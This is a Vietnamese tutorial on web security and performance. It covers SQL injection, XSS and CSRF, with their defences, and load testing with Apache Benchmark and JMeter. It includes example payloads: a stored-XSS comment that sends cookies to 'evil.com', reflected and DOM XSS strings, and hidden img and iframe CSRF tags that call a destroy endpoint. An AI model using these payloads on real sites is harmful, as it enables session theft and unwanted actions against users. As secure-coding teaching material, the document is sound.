Prepared Statements cho phép bạn định nghĩa trước cấu trúc của câu lệnh truy vấn, và sau đó chỉ gán giá trị vào mà không cần lo lắng về việc các giá trị đầu vào có chứa mã độc hay không. Ví dụ trong JavaScript/TypeScript:

Typescript

let query = 'SELECT * FROM users WHERE username = ? AND password = ?';
db.execute(query, [username, password]);
4.2 Sử dụng ORM (Object-Relational Mapping)
Sử dụng các ORM như: Prisma, Sequelize, TypeORM có thể giúp giảm thiểu rủi ro SQL Injection, vì chúng tự động hóa các truy vấn SQL và tránh việc thao tác trực tiếp với câu lệnh SQL.

4.3 Kiểm tra đầu vào (Input Validation)
Kiểm tra đầu vào từ người dùng để đảm bảo chỉ giá trị hợp lệ được chấp nhận. Điều này bao gồm việc giới hạn độ dài của chuỗi, chỉ chấp nhận các ký tự hợp lệ, và kiểm tra các định dạng dữ liệu.

4.4 Sử dụng quyền hạn thấp cho cơ sở dữ liệu
Đảm bảo rằng tài khoản cơ sở dữ liệu mà ứng dụng sử dụng chỉ có quyền truy cập hạn chế. Ví dụ, không nên sử dụng tài khoản quản trị để thực hiện các truy vấn thông thường.

4.5 Sử dụng công cụ hỗ trợ kiểm tra và phát hiện SQL Injection
Để phát hiện SQL Injection trong ứng dụng, có nhiều công cụ có thể giúp bạn thực hiện kiểm tra bảo mật:

SQLMap: công cụ open-source mạnh mẽ để tự động phát hiện và khai thác SQL Injection.
OWASP ZAP: công cụ kiểm thử bảo mật ứng dụng web, có khả năng phát hiện các lỗ hổng bảo mật phổ biến bao gồm cả SQL Injection.

4.2 XSS

XSS là gì và tại sao nó nguy hiểm?
Cross-Site Scripting (XSS) là lỗ hổng bảo mật cho phép kẻ tấn công chèn và thực thi mã JavaScript độc hại trên trình duyệt của người dùng. Khác với các lỗ hổng khác tấn công vào máy chủ, XSS nhắm vào người dùng cuối - biến trình duyệt của họ thành "vũ khí" chống lại chính họ.

Khi một website không xử lý đúng dữ liệu đầu vào, kẻ tấn công có thể chèn mã script vào trang web. Khi người dùng truy cập trang đó, trình duyệt sẽ thực thi mã độc như thể nó là một phần hợp lệ của trang.

Tại sao XSS lại nguy hiểm?
XSS cho phép kẻ tấn công:

Đánh cắp phiên làm việc (session): Lấy cắp cookie để chiếm đoạt tài khoản người dùng
Thực hiện các hành động giả mạo: Thay mặt người dùng gửi form, thực hiện giao dịch
Thu thập thông tin nhạy cảm: Keylogging, đánh cắp dữ liệu nhập vào form
Thay đổi nội dung trang: Thực hiện phishing bằng cách chèn form giả mạo
Tạo cửa hậu (backdoor): Thiết lập kết nối liên tục đến trình duyệt nạn nhân
Theo báo cáo từ các công ty bảo mật, lỗ hổng XSS luôn nằm trong top 10 các lỗ hổng phổ biến nhất và gây thiệt hại lớn cho doanh nghiệp mỗi năm. Đây không phải là vấn đề của riêng các ứng dụng nhỏ - ngay cả những tên tuổi lớn như Facebook, Google đôi khi cũng bị ảnh hưởng.


**Các loại XSS và cách nhận diện**

XSS thường được phân thành ba loại chính. Mỗi loại có đặc trưng riêng và đòi hỏi phương pháp khai thác và phòng chống khác nhau.

1. Reflected XSS
Cách hoạt động: Payload XSS được gửi đến server (thường qua URL) và phản chiếu ngay lập tức trong phản hồi. Khi người dùng nhấp vào link độc hại, trình duyệt sẽ thực thi mã độc.

Ví dụ: Hãy tưởng tượng một trang tìm kiếm hiển thị lại từ khóa người dùng nhập vào:

https://example.com/search?q=<script>alert('XSS')</script>

Nếu website không escape đầu vào, thẻ <script> sẽ được thực thi và hiển thị hộp thoại cảnh báo.

Dấu hiệu nhận biết:

Payload xuất hiện trong tham số URL/form data
Mã độc được thực thi ngay lập tức sau khi tải trang
Hiệu ứng không tồn tại khi tải lại trang mà không có payload

<img width="1026" height="662" alt="image" src="https://github.com/user-attachments/assets/11b5da5c-fd92-440c-92e0-82437f373fd7" />

2. Stored XSS (Persistent XSS)
Cách hoạt động: Payload được lưu trữ vĩnh viễn trên máy chủ (thường trong cơ sở dữ liệu) và được trình duyệt thực thi mỗi khi người dùng truy cập trang chứa payload.

Ví dụ: Kẻ tấn công đăng một bình luận chứa mã độc trên một blog:

Bài viết hay!<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>

Khi người dùng khác xem bài đăng, script sẽ chạy và gửi cookie của họ đến máy chủ kẻ tấn công.

Dấu hiệu nhận biết:

Mã độc được thực thi cho mọi người dùng truy cập trang
Hiệu ứng tồn tại lâu dài, ngay cả khi tải lại trang
Payload thường được đưa vào từ các form dữ liệu lưu trữ: bình luận, hồ sơ, tin nhắn, v.v.

<img width="1078" height="697" alt="image" src="https://github.com/user-attachments/assets/04d2c83a-bbf9-4e1c-acc1-886dabad1c1f" />

3. DOM-based XSS
Cách hoạt động: Xảy ra khi JavaScript trang web thao tác không an toàn với DOM, chèn dữ liệu từ người dùng trực tiếp vào DOM mà không sanitize đúng cách.

Ví dụ: Một trang web sử dụng JavaScript để lấy giá trị hash từ URL và chèn vào trang:

// Địa chỉ URL: https://example.com/#<img src=x onerror=alert(1)> document.getElementById("content").innerHTML = location.hash.substring(1);

Dấu hiệu nhận biết:

Mã độc không được gửi đến máy chủ
Lỗ hổng nằm trong mã JavaScript phía client
Payload thường xuất hiện trong phần fragment URL (#) hoặc trong localStorage/sessionStorage
Khó phát hiện hơn bằng scanner truyền thống vì logic nằm ở client-side
Hiểu rõ sự khác biệt giữa các loại XSS là bước đầu tiên để xác định và phòng chống hiệu quả. Mỗi loại đòi hỏi phương pháp tiếp cận khác nhau, nhưng tất cả đều dựa trên một nguyên tắc cơ bản: kiểm soát dữ liệu người dùng trước khi đưa vào trang web.

<img width="1130" height="670" alt="image" src="https://github.com/user-attachments/assets/fb5a2e73-050a-4df2-b142-8c55a7bbe3b5" />


**Phòng chống XSS hiệu quả: Hướng dẫn theo vai trò**
Phòng chống XSS đòi hỏi sự phối hợp từ mọi vai trò trong quy trình phát triển. Dưới đây là những best practices dành cho từng vai trò.

Dành cho Front-end Developer
Hạn chế sử dụng trực tiếp HTML tùy ý:
Tránh sử dụng innerHTML và các API chấp nhận HTML
Ưu tiên textContent hoặc innerText khi hiển thị dữ liệu
Dùng API DOM như createElement() thay vì nối chuỗi HTML
Tận dụng các framework hiện đại:
React, Vue, Angular mặc định escape HTML trước khi render
Không tắt cơ chế bảo vệ này (v-html, dangerouslySetInnerHTML, etc.) trừ khi thực sự cần thiết
Sử dụng template literals ES6 để tránh nối chuỗi không an toàn
Xử lý URL và dữ liệu cẩn thận:
Kiểm tra URL trước khi sử dụng (đặc biệt là javascript: URLs)
Không gán trực tiếp dữ liệu người dùng vào thuộc tính sự kiện
Sử dụng URLSearchParams để xử lý tham số URL
Áp dụng sanitizer phía client khi cần:
Dùng DOMPurify khi phải hiển thị HTML do người dùng tạo
Cấu hình whitelist chặt chẽ (chỉ cho phép thẻ, thuộc tính cần thiết)
Luôn cập nhật thư viện sanitizer lên phiên bản mới nhất
Dành cho Back-end Developer
Escape output theo ngữ cảnh:
Trong HTML: escape < > & " '
Trong thuộc tính: đóng ngoặc kép đúng cách, escape "
Trong JavaScript: escape ký tự đặc biệt hoặc tốt nhất là sử dụng JSON
Trong URL: dùng encodeURIComponent()
Sử dụng thư viện có sẵn thay vì tự code:
PHP: htmlspecialchars() với flag ENT_QUOTES
Java: HtmlUtils.htmlEscape()
Node.js: he package
Áp dụng CSP và security headers:
Cấu hình và gửi CSP header trong mọi response
Thêm các header bảo mật khác: X-XSS-Protection, X-Content-Type-Options
Thiết lập cookie với flag HttpOnly để tránh đánh cắp qua XSS
Xử lý dữ liệu đầu vào:
Whitelist hợp lệ hóa hơn là blacklist
Chuẩn hóa dữ liệu trước khi validate
Lưu trữ dữ liệu được sanitize khi cần hiển thị HTML
Dành cho Security Engineer
Triển khai nhiều lớp phòng thủ:
Áp dụng nguyên tắc "Defense in Depth"
Kết hợp input validation, output encoding, CSP
Đảm bảo các lớp phòng thủ bổ sung cho nhau
Cấu hình CSP tối ưu:
Sử dụng nonce hoặc hash thay vì domain whitelist
Bật strict-dynamic khi có thể
Thiết lập báo cáo vi phạm CSP
Kiểm thử CSP trên nhiều trình duyệt
Tự động hóa kiểm tra bảo mật:
Tích hợp SAST/DAST vào quy trình CI/CD
Tự động quét mã nguồn phát hiện XSS
Thiết lập WAF thông minh (nhưng không phụ thuộc hoàn toàn)
Đào tạo và nâng cao nhận thức:
Tổ chức các buổi đào tạo về secure coding
Xây dựng tài liệu hướng dẫn phòng chống XSS
Chia sẻ các case study về tấn công XSS
Dành cho Tester và Pentester
Kiểm tra XSS toàn diện:
Thử nghiệm trên mọi đầu vào: form, URL, header, JSON...
Kiểm tra các ngữ cảnh: HTML, attributes, JavaScript, CSS...
Sử dụng các payload đa dạng từ cheat sheet
Kiểm tra hiệu quả của các biện pháp bảo vệ:
Thử vượt qua WAF, CSP với các kỹ thuật nâng cao
Đánh giá hiệu quả của input validation và output encoding
Kiểm tra cách xử lý biên mạch (edge case)
Kết hợp thủ công và tự động:
Dùng scanner (Burp Suite, OWASP ZAP) để phát hiện sơ bộ
Phân tích thủ công để tìm lỗ hổng phức tạp
Tùy chỉnh payload dựa trên ngữ cảnh cụ thể
Báo cáo chi tiết và đề xuất khắc phục:
Mô tả rõ lỗ hổng, ngữ cảnh và cách khai thác
Đề xuất giải pháp phù hợp cho từng lỗ hổng
Cung cấp PoC (Proof-of-Concept) an toàn
Thực hiện đồng bộ các biện pháp phòng chống từ tất cả các vai trò, kết hợp với hiểu biết về kỹ thuật tấn công sẽ tạo nên một hệ thống phòng thủ mạnh mẽ trước XSS.

4.3 CSRF

1 CSRF là gì?
CSRF ( Cross Site Request Forgery) là kỹ thuật tấn công bằng cách sử dụng quyền chứng thực của người dùng đối với một website. CSRF là kỹ thuật tấn công vào người dùng, dựa vào đó hacker có thể thực thi những thao tác phải yêu cầu sự chứng thực. Hiểu một cách nôm na, đây là kỹ thuật tấn công dựa vào mượn quyền trái phép.

CSRF còn được gọi là "session riding", "XSRF"

2 Lịch sử về tấn công CSRF
Các kiểu tấn công CSRF xuất hiện từ những năm 1990, tuy nhiên các cuộc tấn công này xuất phát từ chính IP của người sử dụng nên log file của các website không cho thấy các dấu hiệu của CSRF. Các cuộc tấn công theo kĩ thuật CSRF không được báo cáo đầy đủ, đến năm 2007 mới có một vài tài liệu miêu tả chi tiết về các trường hợp tấn công CSRF.

Năm 2008 người ta phát hiện ra có khoảng 18 triệu người sử dụng eBay ở Hàn Quốc mất các thông tin cá nhân của mình. Cũng trong năm 2008, một số khách hàng tại ngân hàng Mexico bị mất tài khoản cá nhân của mình.Trong 2 trường hợp kể trên hacker đều sử dụng kĩ thuật tấn công CSRF.

3 Kịch bản tấn công CSRF
Các ứng dụng web hoạt động theo cơ chế nhận các câu lệnh HTTP từ người sử dụng, sau đó thực thi các câu lệnh này. Hacker sử dụng phương pháp CSRF để lừa trình duyệt của người dùng gửi đi các câu lệnh http đến các ứng dụng web. Điều đó có thể thực hiện bằng cách chèn mã độc hay link đến trang web mà người dùng đã được chứng thực. Trong trường hợp phiên làm việc của người dùng chưa hết hiệu lực thì các câu lệnh trên sẽ được thực hiện với quyền chứng thực của người sử dụng. Ta có thể xét ví dụ sau:

Người dùng Alie truy cập 1 diễn đàn yêu thích của mình như thường lệ. Một người dùng khác, Bob đăng tải 1 thông điệp lên diễn đàn. Giả sử rằng Bob có ý đồ không tốt và anh ta muốn xóa đi một dự án quan trọng nào đó mà Alice đang làm.
Bob sẽ tạo 1 bài viết, trong đó có chèn thêm 1 đoạn code như sau:
<img height="0" width="0" src="http://www.webapp.com/project/1/destroy">

Để tăng hiệu quả che dấu, đoạn mã trên có thể được thêm các thông điệp bình thường để người dùng không chú ý. Thêm vào đó thẻ img sử dụng trong trường hợp này có kích thước 0x0 pixel và người dùng sẽ không thể thấy được.

Giả sử Alie đang truy cập vào tài khoản của mình ở www.webapp.com và chưa thực hiện logout để kết thúc. Bằng việc xem bài post, trình duyệt của Alice sẽ đọc thẻ img và cố gắng load ảnh từ www.webapp.com, do đó sẽ gửi câu lệnh xóa đến địa chỉ này.
Ứng dụng web ở www.webapp.com sẽ chứng thực Alice và sẽ xóa project với ID là 1. Nó sẽ trả về trang kết quả mà không phải là ảnh, do đó trình duyệt sẽ không hiển thị ảnh.
Ngoài thẻ img, các thẻ html có thể sử dụng kĩ thuật trên có thể là:

<iframe height="0" width="0" src="http://www.webapp.com/project/1/destroy">

<link ref="stylesheet" href="http://www.webapp.com/project/1/destroy" type="text/css"/>

<bgsound src="http://www.webapp.com/project/1/destroy"/>

<background src="http://www.webapp.com/project/1/destroy"/>

<script type="text/javascript" src="http://www.webapp.com/project/1/destroy"/>

Các kĩ thuật CSRF rất đa dạng, lừa người dùng click vào link, gửi email chứa các đoạn mã độc đến người dùng… Hacker còn có thể che giấu các link ở trên rất khéo léo. Ví dụ trong trường hợp thẻ img, người dùng có thể nhận ra nếu vào đường link chứa trong

<ing src="http://www.webapp.com/project/1/destroy"/>

Tuy nhiên, người dùng sẽ rất có phát hiện nếu hacker dùng đường link như sau:

<img height="0" width="0" src="http://www.ahackersite.com/abc.jpg"/>

và cấu hình lại máy chủ:

Redirect 302/abc.jpg http://www.webapp.com/project/1/destroy"/>

Như vậy người dùng sẽ rất khó để có thể phát hiện, vấn đề trách nhiệm phần lớn thuộc về các website của các nhà cung cấp.

4 Cách phòng chống tấn công CSRF
Dựa trên nguyên tắc của CSRF "lừa trình duyệt của người dùng (hoặc người dùng) gửi các câu lệnh HTTP", các kĩ thuật phòng tránh sẽ tập trung vào việc tìm cách phân biệt và hạn chế các câu lệnh giả mạo.

4.1 Phía user
Để phòng tránh trở thành nạn nhân của các cuộc tấn công CSRF, người dùng internet nên thực hiện một số lưu ý sau:

Nên thoát khỏi các website quan trọng: Tài khoản ngân hàng, thanh toán trực tuyến, các mạng xã hội, gmail, yahoo… khi đã thực hiện xong giao dịch hay các công việc cần làm. (Check - email, checkin…)
Không nên click vào các đường dẫn mà bạn nhận được qua email, qua facebook … Khi bạn đưa chuột qua 1 đường dẫn, phía dưới bên trái của trình duyệt thường có địa chỉ website đích, bạn nên lưu ý để đến đúng trang mình muốn.
Không lưu các thông tin về mật khẩu tại trình duyệt của mình (không nên chọn các phương thức "đăng nhập lần sau", "lưu mật khẩu" …
Trong quá trình thực hiện giao dịch hay vào các website quan trọng không nên vào các website khác, có thể chứa các mã khai thác của kẻ tấn công.
4.2 Phía server
Có nhiều lời khuyến cáo được đưa ra, tuy nhiên cho đến nay vẫn chưa có biện pháp nào có thể phòng chống triệt để CSRF. Sau đây là một vài kĩ thuật sử dụng.

4.2.1 Lựa chọn việc sử dụng GET VÀ POST
Sử dụng GET và POST đúng cách. Dùng GET nếu thao tác là truy vấn dữ liệu. Dùng POST nếu các thao tác tạo ra sự thay đổi hệ thống (theo khuyến cáo của W3C tổ chức tạo ra chuẩn http) Nếu ứng dụng của bạn theo chuẩn RESTful, bạn có thể dùng thêm các HTTP verbs, như PATCH, PUThay DELETE

4.2.2 Sử dụng captcha, các thông báo xác nhận
Captcha được sử dụng để nhận biết đối tượng đang thao tác với hệ thống là con người hay không? Các thao tác quan trọng như "đăng nhập" hay là "chuyển khoản" ,"thanh toán" thường là hay sử dụng captcha. Tuy nhiên, việc sử dụng captcha có thể gây khó khăn cho một vài đối tượng người dùng và làm họ khó chịu. Các thông báo xác nhận cũng thường được sử dụng, ví dụ như việc hiển thị một thông báo xác nhận "bạn có muốn xóa hay k" cũng làm hạn chế các kĩ thuật Cả hai cách trên vẫn có thể bị vượt qua nếu kẻ tấn công có một kịch bản hoàn hảo và kết hợp với lỗi XSS.

4.2.3 Sử dụng token
Tạo ra một token tương ứng với mỗi form, token này sẽ là duy nhất đối với mỗi form và thường thì hàm tạo ra token này sẽ nhận đối số là"SESSION" hoặc được lưu thông tin trong SESSION. Khi nhận lệnh HTTP POST về, hệ thống sẽ thực hiên so khớp giá trị token này để quyết định có thực hiện hay không. Mặc định trong Rails, khi tạo ứng dụng mới:

class ApplicationController < ActionController::Base
  protect_from_forgery with: :exception
end

Khi đó tất cả các form và Ajax request được tự động thêm sercurity token generate bởi Rails. Nếu security token không khớp, exception sẽ được ném ra.

4.2.4 Sử dụng cookie riêng biệt cho trang quản trị
Một cookie không thể dùng chung cho các domain khác nhau,chính vì vậy việc sử dụng "admin.site.com" thay vì sử dụng "site.com/admin" là an toàn hơn.

4.2.5 Kiểm tra REFERRER
Kiểm tra xem các câu lệnh http gửi đến hệ thống xuất phát từ đâu. Một ứng dụng web có thể hạn chế chỉ thực hiện các lệnh http gửi đến từ các trang đã được chứng thực. Tuy nhiên cách làm này có nhiều hạn chế và không thật sự hiệu quả.

4.2.6 Kiểm tra IP
Một số hệ thống quan trọng chỉ cho truy cập từ những IP được thiết lập sẵn


# II. Hiệu xuất và Monitoring

1. Công cụ đo lường hiệu suất (Apache Benchmark, JMeter).
1.1 Apache Benchmark
1. Khái niệm cơ bản
Apache Benchmark (thường được gọi tắt là ab) là một công cụ mã nguồn mở chạy trên giao diện dòng lệnh (CLI), được thiết kế để đo lường hiệu năng (benchmarking) của các máy chủ web thông qua giao thức HTTP/HTTPS. Mặc dù ban đầu được phát triển riêng để kiểm tra hiệu suất của máy chủ Apache HTTP, nhưng hiện nay ab có thể được sử dụng để kiểm thử sức chịu tải của bất kỳ loại web server hay web application nào (như Nginx, IIS, hoặc các ứng dụng viết bằng Python, Node.js).

2. Mục đích và Vai trò
Vai trò chính của ab là giúp các kỹ sư hệ thống và nhà phát triển trả lời câu hỏi cốt lõi: "Máy chủ hiện tại có thể chịu tải được bao nhiêu lượng truy cập cùng lúc trước khi bị nghẽn mạng hoặc từ chối dịch vụ?"

Kiểm thử tải (Load Testing): Đánh giá khả năng xử lý của server dưới một mức tải dự kiến để đảm bảo hệ thống vận hành ổn định.

Kiểm thử giới hạn (Stress Testing): Đẩy lượng request lên mức cực cao để tìm ra "điểm chết" (bottleneck) của hệ thống, qua đó xem xét cách server phản ứng và phục hồi khi bị quá tải.

Đo lường tối ưu hóa (Performance Benchmarking): Sử dụng làm thước đo so sánh hiệu năng trước và sau khi thay đổi cấu hình hạ tầng (ví dụ: test trước và sau khi tích hợp Load Balancer hoặc tinh chỉnh Firewall).

3. Đặc điểm và Ưu điểm nổi bật

Gọn nhẹ và Tốc độ: Tiêu tốn rất ít tài nguyên phần cứng của máy khách (máy dùng để đi test).

Triển khai nhanh chóng: Tích hợp sẵn trong hệ sinh thái của Linux (thông qua gói apache2-utils), không tốn công cài đặt các phần mềm cồng kềnh.

Cú pháp thực thi đơn giản: Chỉ với một dòng lệnh kết hợp các tham số cơ bản (như -n quy định tổng số request, -c quy định số request đồng thời), người dùng đã có thể giả lập hàng ngàn kết nối.

Báo cáo trực quan: Cung cấp ngay lập tức các chỉ số hiệu năng quan trọng nhất như:

Requests per second (RPS): Số truy cập xử lý được trong một giây.

Time per request: Độ trễ phản hồi.

Transfer rate: Tốc độ truyền tải dữ liệu mạng.

4. Hạn chế cần lưu ý

Thiếu tính kịch bản: ab chỉ tập trung bắn các luồng request tĩnh (Get/Post) vào một endpoint cố định. Nó không thể giả lập các hành vi phức tạp của người dùng thực tế như lướt trang, đăng nhập liên tục theo kịch bản, hay thực thi các mã JavaScript trên trình duyệt.

Giới hạn về phân tích sâu: Không hỗ trợ tốt việc lưu trữ cookie/session phức tạp trong các bài test dài hơi so với các công cụ chuyên dụng cao cấp hơn như Apache JMeter hay K6.

1. Cài đặt Apache Bench
Apache Bench không nằm trong một gói phần mềm độc lập mà được tích hợp sẵn trong gói apache2-utils. Bạn mở terminal và chạy các lệnh sau:

Bash
# Cập nhật danh sách các gói phần mềm
sudo apt update

# Cài đặt gói apache2-utils
sudo apt install apache2-utils -y
Sau khi quá trình cài đặt hoàn tất, bạn có thể kiểm tra xem ab đã được cài đặt thành công hay chưa và xem phiên bản hiện tại bằng lệnh:

Bash
ab -V

  <img width="994" height="156" alt="image" src="https://github.com/user-attachments/assets/ffec1332-6c67-4ed6-8918-5a74d5f390a7" />

2. Cách chạy bài test cơ bản
Cú pháp cơ bản của Apache Bench để test hiệu năng server là:

Bash
ab -n [tổng_số_request] -c [số_request_đồng_thời] [URL]
-n (number): Tổng số lượng requests bạn muốn gửi đến server.

-c (concurrency): Số lượng requests được gửi đi cùng một lúc (đồng thời).

Ví dụ thực tế:
Giả sử bạn muốn gửi tổng cộng 1000 requests, với 100 requests chạy cùng lúc tới trang [http://example.com/](http://example.com/), bạn sẽ chạy lệnh sau:

Bash
ab -n 1000 -c 100 http://example.com/
Lưu ý nhỏ nhưng rất quan trọng: URL của bạn bắt buộc phải kết thúc bằng dấu gạch chéo / nếu bạn đang test thư mục gốc (root) của domain. (Ví dụ: dùng [http://example.com/](http://example.com/) thay vì [http://example.com](http://example.com)).

3. Đọc hiểu kết quả test

ab -n 100 -c 10 http://127.0.0.1/ 

<img width="919" height="857" alt="image" src="https://github.com/user-attachments/assets/9c68e5fa-4d40-4737-87e4-a43f8eff3ef4" />

  
<img width="804" height="756" alt="image" src="https://github.com/user-attachments/assets/1904896e-93e8-4e84-9fd6-cced9cad3b92" />
  
Sau khi chạy xong, terminal sẽ in ra một bảng thống kê khá dài. Đây là những thông số quan trọng nhất bạn cần chú ý để đánh giá server:

Failed requests: Số lượng request bị lỗi. Lý tưởng nhất con số này phải là 0. Nếu số này cao, server của bạn đang bị quá tải hoặc có lỗi cấu hình.

Requests per second (RPS): Số request mà server xử lý thành công trong một giây. Đây là chỉ số quan trọng nhất để đánh giá sức chịu tải của server. Con số này càng cao thì server càng mạnh.

Time per request (mean): Thời gian trung bình để server xử lý một lượt các request đồng thời.

Time per request (mean, across all concurrent requests): Thời gian trung bình thực tế cho mỗi request đơn lẻ (càng thấp tốc độ phản hồi càng nhanh).

Percentage of the requests served within a certain time (ms): Bảng thống kê phân vị ở cuối kết quả cho biết thời gian phản hồi của các request. Ví dụ: 90% 250 có nghĩa là 90% số request được xử lý trong vòng 250 milliseconds trở xuống.

  
1.2 Jmeter
Jmeter là gì?

Jmeter là công cụ để đo độ tải và performance của đối tượng, có thể sử dụng để test performance trên cả nguồn tĩnh và nguồn động, có thể kiểm tra độ tải và hiệu năng trên nhiều loại server khác nhau như: Web – HTTP, HTTPS, SOAP, Database via JDBC, LDAP, JMS, Mail – SMTP(S), POP3(S) và IMAP(S)…
Jmeter là một phần mềm mã nguồn mở được viết bằng java. Cha đẻ của JMeter là Stefano Mazzocchi. Sau đó Apache đã thiết kế lại để cải tiến hơn giao diện đồ họa cho người dùng và khả năng kiểm thử hướng chức năng.

  Đặc trưng của Jmeter
Nguồn mở, miễn phí
Giao diện đơn giản, trực quan dễ sử dụng
Có thể kiểm thử nhiều kiểu server: Web - HTTP, HTTPS, SOAP, Database - JDBC, LDAP, JMS, Mail - POP3,…
Một công cụ độc lập có thể chạy trên nhiều nền tảng hệ điều hành khác nhau, trên Linux chỉ cần chạy bằng một shell scrip, trên Windows thì chỉ cần chạy một file .bat
Đa luồng, giúp xử lý tạo nhiều request cùng một khoảng thời gian, xử lý các dữ liệu thu được một cách hiệu quả.
Đặc tính mở rộng, có rất nhiều plugin được chia trẻ rộng rãi và miễn phí
Cách thức hoạt động
Jmeter thực hiện giả lập một nhóm người dùng gửi các yêu cầu tới một máy chủ, nhận và xử lý các phản hồi từ máy chủ và cung cấp các kết quả báo cáo hiệu suất dưới dạng biểu đồ trực quan, dễ hiểu.

JMeter Performance Testing bao gồm:

Load testing: Mô hình hóa dự kiến sử dụng bởi nhiều người dùng truy cập một dịch vụ website trong cùng thời điểm.
Stress testing: Tất cả các web server có thể tải một dung lượng lớn, khi mà tải trọng vượt ra ngoài giới hạn thì web server bắt đầu phản hồi chậm và gây ra lỗi. Mục đích của stress testing là có thể tìm ra độ tải lớn mà web server có thể xử lý.

Cài đặt và sử dụng
Bước 1: Cài đặt Java (Bắt buộc)
JMeter được viết bằng Java, nên máy ông phải có môi trường Java thì nó mới chạy được.

Mở CMD (Command Prompt) lên gõ thử: java -version.

Nếu nó hiện ra phiên bản (ví dụ "1.8.x" hoặc "17.0.x") thì ngon, bỏ qua bước này.

Nếu nó báo lỗi kiểu "java is not recognized...", ông lên Google tìm "Download Java JDK 17" (hoặc JDK 21), tải file .exe về cài như phần mềm bình thường (cứ Next liên tục là xong).

Bước 2: Tải file nén JMeter

Lên Google gõ "Download Apache JMeter" và vào thẳng trang chủ của Apache.

Cuộn xuống phần Binaries, ông click tải cái file có đuôi .zip (ví dụ: apache-jmeter-5.6.3.zip).
(Lưu ý: Bỏ qua phần Source, chỉ tải mục Binaries thôi nhé).

Bước 3: Mở lên và dùng luôn

Tải xong, giải nén cái file .zip đó ra (ném ra Desktop hoặc ổ C cho dễ tìm).

Mở thư mục vừa giải nén ra, chui vào thư mục con tên là bin.

Tìm cái file tên là jmeter.bat (Windows Batch File), click đúp vào nó.
  
  <img width="1570" height="873" alt="image" src="https://github.com/user-attachments/assets/153cd4b3-ea41-4a00-8371-9a32d2b75710" />

1. Thêm Thread Group
Click chuột phải vào Test Plan >> Add >> Threads (Users) >> Thread Group

<img width="1485" height="765" alt="image" src="https://github.com/user-attachments/assets/805a188a-648b-4a9a-a7d9-6b942df2e30f" />

Trên cửa sổ Thread Group ta thực hiện nhập Thread properties như sau:

Number of Threads - Số lượng người sử dụng truy cập vào website: 100
Ramp-Up Period: 100
Loop Count - Số thời gian thực hiện kiểm tra: 5
Ramp-Up cùng với Number of Threads sẽ chỉ ra được thời gian trì hoãn trước khi một người dùng tiếp theo bắt đầu sử dụng. Ví dụ: Nếu chúng ta có 100 người dùng và Ram-up 100 giây thì sự chậm trễ giữa những người dùng sẽ là 1 giây.
<img width="1076" height="687" alt="image" src="https://github.com/user-attachments/assets/c38cf885-587d-47af-b701-f708cf37f76a" />

  2. Thêm phần tử Jmeter
HTTP request default

Click chuột phải vào Thread Group Vietnamnet >> Add >> Config Element >> HTTP Request Defaults

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/c6cf40a2-586d-47c0-b955-977f32c54167" />

HTTP Request

Click chuột phải vào Thread Group Vietnamnet >> Add >> Sampler >> HTTP Request
<img width="1214" height="441" alt="image" src="https://github.com/user-attachments/assets/462df686-fa8d-47d7-9f84-ff6ced8ec8c9" />

  Trên cửa sổ HTTP Request, trường Path sẽ chỉ ra URL request nào bạn muốn gửi tới máy chủ:
Nếu để trống JMeter sẽ tạo URL request http://vietnamnet.vn/ tới máy chủ
Nếu muốn tạo URL request http://vietnamnet.vn/vn/thoi-su/ thì nhập: vn/thoi-su/
3. Thêm Graph result
Hiển thị kết quả dưới dạng biểu đồ
Click chuột phải vào Thread Group Vietnamnet >> Add >> Listener >> Graph Results
  
  
  <img width="1032" height="665" alt="image" src="https://github.com/user-attachments/assets/9fb840b0-8f2e-462d-8bce-d0246480468b" />

4. Chạy và lấy kết quả
Click button "Start" hoặc Ctrl + R để chạy:
<img width="1526" height="855" alt="image" src="https://github.com/user-attachments/assets/293dd9ad-e266-4f2d-b348-17ed7da3bf51" />
kết quả theo thời gian thực
  <img width="1468" height="848" alt="image" src="https://github.com/user-attachments/assets/9fcd1c58-fc4f-43b8-8894-bdbd5acf0387" />


  5. Phân tích kết quả
Để phân tích Performance của Web server, ta tập trung vào hai thông số: Throughput và Deviation.
  
<img width="1120" height="751" alt="image" src="https://github.com/user-attachments/assets/4726599b-cef2-45b0-aaf2-38ac3bebc1a4" />

  Throughput là thông số quan trọng nhất, nó miêu tả cho khả năng server có thể xử lý được độ tải lớn.
Trong kết quả test thông số Throughput của máy chủ Vietnamnet là 302.841/phút. Tức là, máy chủ Vietnamnet có thể xử lý 302.841 yêu cầu trên mỗi phút.

Deviation thể hiện sự sai lệch hiện tại so với mức trung bình, thông số này càng nhỏ thì càng tốt.
Deviation của Vietnamnet là 130.

**2. Giám sát log (access log, error log).**

  

  
6. Hiệu suất và Monitoring
•  Công cụ đo lường hiệu suất (Apache Benchmark, JMeter).
•  Giám sát log (access log, error log).
•  Công cụ phân tích (Prometheus, Grafana, ELK Stack).
7. So sánh Web Server vs Application Server
•  Khi nào dùng web server (phục vụ file tĩnh)?
•  Khi nào cần application server (xử lý logic như Node.js, Tomcat)?
8. Xu hướng hiện đại
•  Serverless (AWS Lambda, Cloud Functions).
•  Container hóa (Docker + Web Server).
•  Edge Computing (xử lý gần người dùng hơn).
